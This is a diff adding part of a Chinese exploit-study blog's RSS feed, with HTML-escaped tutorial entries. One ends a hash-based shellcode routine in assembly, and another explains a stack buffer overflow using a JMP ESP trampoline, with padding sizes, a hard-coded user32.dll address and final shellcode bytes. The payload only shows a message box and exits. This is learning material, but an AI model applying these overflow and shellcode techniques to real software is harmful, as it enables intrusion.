+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> compare_hash:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cmp edx, [esp + 0x1c] ;compare to the requested hash(saved on stack from pushad)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> jnz next_function_loop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ebx, [ecx + 0x24] ;ebx = relative offset of ordinals table
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add ebx, ebp ;ebx = absolute addr of ordinals table
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov di, [ebx + 2 * edi] ;di = ordinal number of matched function
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ebx, [ecx + 0x1c] ;ebx = relative offset of address table
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov ebx, ebp ;ebx = absolute addr of address table
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add ebp, [ebx + 4 * edi] ;add to ebp(base addr of module) the relative offset of matched function
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xchg eax, ebp ;move func addr into eax
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pop edi ;edi is last onto stack in pushad
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> stosd ;write function addr to [edi] and increment edi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push edi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> popad ;restore registers and loop until we reach end of alst hash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cmp eax, 0x1e380a6a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> jne find_lib_functions
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> function_call:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xor ebx, ebx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push ebx ;cut string
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x74736577
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push 0x6c696166 ;push failwest
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov eax, esp ;load address of failwest
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push ebx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push eax
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push eax
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push ebx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> call [edi - 0x4] ;call MessageBoxA
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> push ebx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> call[edi - 0x8] ;call ExitProcess
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ;flag
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> nop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> nop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> nop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> nop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> }
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>漏洞利用学习笔记-002-ESP跳板</title><link>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-002-esp%E8%B7%B3%E6%9D%BF/</link><pubDate>Mon, 19 Oct 2020 18:20:00 +0800</pubDate><guid>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-002-esp%E8%B7%B3%E6%9D%BF/</guid><description>&lt;blockquote>
+&lt;p>&lt;a class="link" href="exploit-study-02.zip" >点击此处下载本文附可执行程序，shellcode文件&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>本文来源：&lt;a class="link" href="https://blog.moeomu.com/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-002-esp%e8%b7%b3%e6%9d%bf/" >Moeomu的博客&lt;/a>&lt;/p>
+&lt;h2 id="栈空间移位">栈空间移位&lt;/h2>
+&lt;p>ShellCode在内存中往往是动态的，并非直接填写一个定值&lt;br>
+也就是前一篇中buffer数组的栈空间地址，并非总是个定值&lt;br>
+当CPU执行到此地址时，有可能触发无效指令异常导致程序崩溃，ShellCode无法运行&lt;/p>
+&lt;h3 id="原理">原理&lt;/h3>
+&lt;p>从程序已加载的系统DLL中查找一个&lt;code>JMP ESP&lt;/code>指令的地址，用此地址去淹没返回地址&lt;br>
+这样既能精准定位shellcode的位置，又能适应栈空间的动态变化&lt;br>
+栈的地址是上小下大，CPU的执行顺序是小地址到大地址，栈淹没同样从小地址淹没到大地址&lt;br>
+这样只要将前面的一段空间淹没为无意义数据，将ShellCode的开始恰好淹没在&lt;code>[ESP]&lt;/code>处，就可以达到ShellCode动态寻址&lt;/p>
+&lt;h3 id="shellcode编写">ShellCode编写&lt;/h3>
+&lt;h4 id="结构">结构&lt;/h4>
+&lt;p>无用数据+&lt;code>JMP ESP&lt;/code>地址(此地址恰好淹没到函数返回地址)+命令代码(用于测试，MessageBox弹窗)&lt;/p>
+&lt;blockquote>
+&lt;p>说明：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>retn&lt;/code>后将会跳到&lt;code>JMP ESP&lt;/code>处，随后ESP + 4&lt;/li>
+&lt;li>&lt;code>JMP ESP&lt;/code>后将会正好跳到命令代码处&lt;/li>
+&lt;/ul>
+&lt;/blockquote>
+&lt;h4 id="必要数据">必要数据&lt;/h4>
+&lt;ul>
+&lt;li>&lt;code>JMP ESP&lt;/code>地址：位于User32.dll中&lt;code>0x77D29353&lt;/code>(没必要必须是原版命令，只要搜二进制&lt;code>0xFFE4&lt;/code>即可)&lt;/li>
+&lt;li>垃圾数据大小：52 Byte = Buffer(44 Byte) + authenticated(4 Byte) + EBP(4 Byte)&lt;/li>
+&lt;/ul>
+&lt;h4 id="最终code">最终Code&lt;/h4>
+&lt;blockquote>
+&lt;p>以下是需要执行的命令代码&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">33DB xor ebx,ebx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53 push ebx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">68 6D756F6F push 0x6F6F756D
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">68 4D6F656F push 0x6F656F4D
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">8BC4 mov eax,esp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53 push ebx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">50 push eax
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">50 push eax
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53 push ebx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">B8 EA07D577 mov eax,user32.MessageBoxA
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FFD0 call eax
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">B8 FACA817C mov eax,kernel32.ExitProcess
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FFD0 call eax
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;blockquote>
+&lt;p>最终的ShellCode&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">34&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">32&lt;/span> &lt;span class="mi">31&lt;/span> &lt;span class="mi">53&lt;/span> &lt;span class="mi">93&lt;/span> &lt;span class="n">D2&lt;/span> &lt;span class="mi">77&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="n">DB&lt;/span> &lt;span class="mi">53&lt;/span> &lt;span class="mi">68&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="n">D&lt;/span> &lt;span class="mi">75&lt;/span> &lt;span class="mf">6F&lt;/span> &lt;span class="mf">6F&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">68&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="n">D&lt;/span> &lt;span class="mf">6F&lt;/span> &lt;span class="mi">65&lt;/span> &lt;span class="mf">6F&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="n">B&lt;/span> &lt;span class="n">C4&lt;/span> &lt;span class="mi">53&lt;/span> &lt;span class="mi">50&lt;/span> &lt;span class="mi">50&lt;/span> &lt;span class="mi">53&lt;/span> &lt;span class="n">B8&lt;/span> &lt;span class="n">EA&lt;/span> &lt;span class="mo">07&lt;/span> &lt;span class="n">D5&lt;/span> &lt;span class="mi">77&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">FF&lt;/span> &lt;span class="n">D0&lt;/span> &lt;span class="n">B8&lt;/span> &lt;span class="n">FA&lt;/span> &lt;span class="n">CA&lt;/span> &lt;span class="mi">81&lt;/span> &lt;span class="mi">7&lt;/span>&lt;span class="n">C&lt;/span> &lt;span class="n">FF&lt;/span> &lt;span class="n">D0&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item></channel></rss>
